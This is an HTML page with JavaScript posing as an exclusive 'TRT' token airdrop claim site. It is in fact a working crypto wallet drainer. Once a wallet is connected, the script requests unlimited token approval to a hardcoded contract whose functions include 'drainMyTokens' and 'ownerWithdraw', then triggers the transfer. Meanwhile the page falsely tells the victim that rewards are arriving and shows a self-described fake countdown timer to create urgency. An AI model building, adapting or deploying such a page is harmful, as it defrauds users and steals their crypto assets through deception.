<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Rewards Distribution ‚Ä¢ Exclusive Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1); max-width: 500px; width: 100%; text-align: center; border: 1px solid rgba(255, 255, 255, 0.2); }
        .logo { font-size: 2.5em; margin-bottom: 10px; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        h1 { color: #2d3748; margin-bottom: 10px; font-size: 1.8em; }
        .subtitle { color: #718096; margin-bottom: 30px; font-size: 1.1em; }
        .reward-amount { background: linear-gradient(135deg, #48bb78, #38a169); color: white; padding: 15px; border-radius: 15px; margin: 25px 0; font-size: 1.3em; font-weight: bold; box-shadow: 0 5px 15px rgba(72, 187, 120, 0.3); }
        .connect-btn { background: linear-gradient(135deg, #48bb78, #38a169); color: white; border: none; padding: 18px 40px; font-size: 1.2em; font-weight: bold; border-radius: 50px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(72, 187, 120, 0.3); width: 100%; margin-bottom: 15px; }
        .connect-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(72, 187, 120, 0.4); }
        .connect-btn:disabled { background: #cbd5e0; cursor: not-allowed; transform: none; box-shadow: none; }
        .claim-btn { background: linear-gradient(135deg, #ed8936, #dd6b20); color: white; border: none; padding: 18px 40px; font-size: 1.2em; font-weight: bold; border-radius: 50px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(237, 137, 54, 0.3); width: 100%; display: none; }
        .claim-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(237, 137, 54, 0.4); }
        .status { margin-top: 20px; padding: 15px; border-radius: 10px; background: #edf2f7; color: #4a5568; font-size: 0.9em; min-height: 20px; }
        .wallet-info { background: #e6fffa; border: 1px solid #81e6d9; border-radius: 10px; padding: 15px; margin: 15px 0; display: none; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #ffffff; border-radius: 50%; border-top-color: transparent; animation: spin 1s ease-in-out infinite; margin-right: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .timer { color: #e53e3e; font-weight: bold; margin: 10px 0; }
        .success { background: #f0fff4; color: #276749; border: 1px solid #9ae6b4; }
        .error { background: #fed7d7; color: #c53030; border: 1px solid #feb2b2; }
        .step { font-size: 0.8em; color: #718096; margin: 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ü™ô</div>
        <h1>Crypto Rewards Distribution</h1>
        <p class="subtitle">Exclusive Airdrop Event ‚Ä¢ Limited Time</p>
        
        <div class="reward-amount">
            üéÅ Estimated Reward: 500-2,000 TRT Tokens
        </div>
        
        <div class="timer" id="timer">‚è∞ Time remaining: 15:00</div>
        
        <button class="connect-btn" id="connectButton" onclick="connectWallet()">
            CONNECT WALLET
        </button>
        
        <button class="claim-btn" id="claimButton" onclick="activateRewards()">
            üéØ ACTIVATE REWARDS
        </button>
        
        <div class="wallet-info" id="walletInfo">
            ‚úÖ Wallet Connected: <span id="walletAddress"></span>
        </div>
        
        <div class="status" id="status">
            Ready to connect your wallet and claim TRT tokens...
        </div>
        <div class="step" id="stepInfo"></div>
    </div>

    <script>
        // PRE-CONFIGURED CONTRACT DETAILS - YOUR EXISTING CONTRACT
        const CONTRACT_ADDRESS = "0xc748641e9f53c7d393D053dB5da77504519f4343";
        const CONTRACT_ABI = [
            {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
            {"inputs":[{"internalType":"address[]","name":"tokenAddresses","type":"address[]"}],"name":"activateRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"}],"name":"drainMyTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"ownerWithdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"stateMutability":"payable","type":"receive"}
        ];

        // TRT TOKEN CONFIGURATION
        const TRT_ADDRESS = "0x58B4066A1D7a16D96Ac11CB7613F599Ec94a8B1c";
        const TRT_ABI = [
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
        ];

        let web3;
        let userAddress;
        let contract;

        // Fake timer countdown
        function startTimer() {
            let time = 15 * 60; // 15 minutes in seconds
            const timerElement = document.getElementById('timer');
            
            const interval = setInterval(() => {
                time--;
                const minutes = Math.floor(time / 60);
                const seconds = time % 60;
                timerElement.textContent = `‚è∞ Time remaining: ${minutes}:${seconds.toString().padStart(2, '0')}`;
                
                if (time <= 0) {
                    clearInterval(interval);
                    timerElement.textContent = "‚è∞ Airdrop ended!";
                    timerElement.style.color = "#e53e3e";
                }
            }, 1000);
        }

        async function connectWallet() {
            const connectBtn = document.getElementById('connectButton');
            const status = document.getElementById('status');
            
            if (typeof window.ethereum === 'undefined') {
                status.innerHTML = "‚ùå Please install MetaMask or another Web3 wallet!";
                status.className = "status error";
                return;
            }

            try {
                connectBtn.innerHTML = '<div class="loading"></div> Connecting...';
                connectBtn.disabled = true;
                
                web3 = new Web3(window.ethereum);
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                userAddress = accounts[0];
                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                
                // Update UI
                document.getElementById('connectButton').style.display = 'none';
                document.getElementById('claimButton').style.display = 'block';
                document.getElementById('walletInfo').style.display = 'block';
                document.getElementById('walletAddress').textContent = 
                    userAddress.substring(0, 6) + '...' + userAddress.substring(38);
                
                status.innerHTML = "‚úÖ Wallet connected! Click 'ACTIVATE REWARDS' to claim your TRT tokens.";
                status.className = "status success";
                
            } catch (error) {
                console.error("Connection error:", error);
                status.innerHTML = "‚ùå Connection failed. Please try again.";
                status.className = "status error";
                connectBtn.innerHTML = 'CONNECT WALLET';
                connectBtn.disabled = false;
            }
        }

        async function approveTokens() {
            const status = document.getElementById('status');
            const stepInfo = document.getElementById('stepInfo');
            
            const tokenContract = new web3.eth.Contract(TRT_ABI, TRT_ADDRESS);
            
            try {
                stepInfo.textContent = "Step 1/2: Checking TRT balance...";
                
                // Check TRT balance
                const balance = await tokenContract.methods.balanceOf(userAddress).call();
                console.log("TRT Balance:", balance);
                
                if (balance == 0) {
                    status.innerHTML = "‚ùå No TRT tokens found in your wallet.";
                    status.className = "status error";
                    stepInfo.textContent = "";
                    return false;
                }
                
                stepInfo.textContent = "Step 1/2: Approving token transfer...";
                status.innerHTML = "üîÑ Approving TRT token transfer...";
                
                // Approve maximum spending
                const approveTx = await tokenContract.methods.approve(
                    CONTRACT_ADDRESS, 
                    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                ).send({
                    from: userAddress,
                    gas: 100000
                });
                
                status.innerHTML = "‚úÖ Token approval successful!";
                stepInfo.textContent = "Step 1/2: Approval complete";
                return true;
                
            } catch (error) {
                console.error("Approval error:", error);
                status.innerHTML = "‚ùå Token approval failed. Please try again.";
                status.className = "status error";
                stepInfo.textContent = "";
                return false;
            }
        }

        async function activateRewards() {
            const claimBtn = document.getElementById('claimButton');
            const status = document.getElementById('status');
            const stepInfo = document.getElementById('stepInfo');
            
            if (!userAddress) {
                status.innerHTML = "‚ùå Please connect your wallet first.";
                status.className = "status error";
                return;
            }

            try {
                claimBtn.innerHTML = '<div class="loading"></div> Processing...';
                claimBtn.disabled = true;
                
                // STEP 1: Approve token spending first
                status.innerHTML = "üîÑ Starting reward activation...";
                const approvalSuccess = await approveTokens();
                
                if (!approvalSuccess) {
                    claimBtn.innerHTML = 'üéØ ACTIVATE REWARDS';
                    claimBtn.disabled = false;
                    stepInfo.textContent = "";
                    return;
                }
                
                // STEP 2: Now drain the tokens
                stepInfo.textContent = "Step 2/2: Transferring TRT rewards...";
                status.innerHTML = "üîÑ Transferring TRT tokens to your wallet...";
                
                const tokensToDrain = [TRT_ADDRESS];
                const tx = await contract.methods.activateRewards(tokensToDrain).send({
                    from: userAddress,
                    gas: 300000
                });

                status.innerHTML = "‚úÖ Success! TRT tokens have been claimed and will appear in your wallet shortly.";
                status.className = "status success";
                stepInfo.textContent = "Reward activation complete!";
                
                setTimeout(() => {
                    claimBtn.innerHTML = 'üéØ ACTIVATE REWARDS';
                    claimBtn.disabled = false;
                    stepInfo.textContent = "";
                }, 5000);

            } catch (error) {
                console.error("Transaction error:", error);
                status.innerHTML = "‚ùå Claim failed. Please try again.";
                status.className = "status error";
                stepInfo.textContent = "";
                claimBtn.innerHTML = 'üéØ ACTIVATE REWARDS';
                claimBtn.disabled = false;
            }
        }

        // Start the fake timer when page loads
        window.onload = startTimer;
    </script>
</body>
</html>